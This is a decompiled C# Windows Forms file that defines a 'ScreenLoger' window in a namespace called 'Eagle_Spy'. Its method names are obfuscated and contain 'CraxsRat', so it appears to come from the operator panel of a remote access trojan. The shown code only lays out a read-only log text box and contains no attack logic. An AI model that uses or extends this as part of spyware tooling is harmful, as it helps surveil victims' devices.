using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy;

[DesignerGenerated]
public class ScreenLoger : Form
{
	private IContainer components;

	[field: AccessedThroughProperty("Logs")]
	internal TextBox Logs
	;

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
				components.Dispose();
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.Logs = new System.Windows.Forms.TextBox();
		base.SuspendLayout();
		this.Logs.BackColor = System.Drawing.Color.Black;
		this.Logs.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.Logs.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Logs.Font = new System.Drawing.Font("Microsoft PhagsPa", 11f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.Logs.ForeColor = System.Drawing.Color.White;
		this.Logs.Location = new System.Drawing.Point(0, 0);
		this.Logs.Multiline = true;
		this.Logs.Name = "Logs";
		this.Logs.ReadOnly = true;
		this.Logs.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
		this.Logs.Size = new System.Drawing.Size(524, 601);
		this.Logs.TabIndex = 0;
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 16f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(524, 601);
		base.ControlBox = false;
		base.Controls.Add(this.Logs);
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow;
		base.Name = "ScreenLoger";
		base.ShowIcon = false;
		base.ShowInTaskbar = false;
		this.Text = "ScreenLoger";
		base.ResumeLayout(false);
		base.PerformLayout();
	}

	public void CraxsRatkfvuiorkenfudpajrsnCraxsRatsfewxc()
	{
		InitializeComponent();
	}

	public ScreenLoger()
	{
		CraxsRatkfvuiorkenfudpajrsnCraxsRatsfewxc();
	}
}
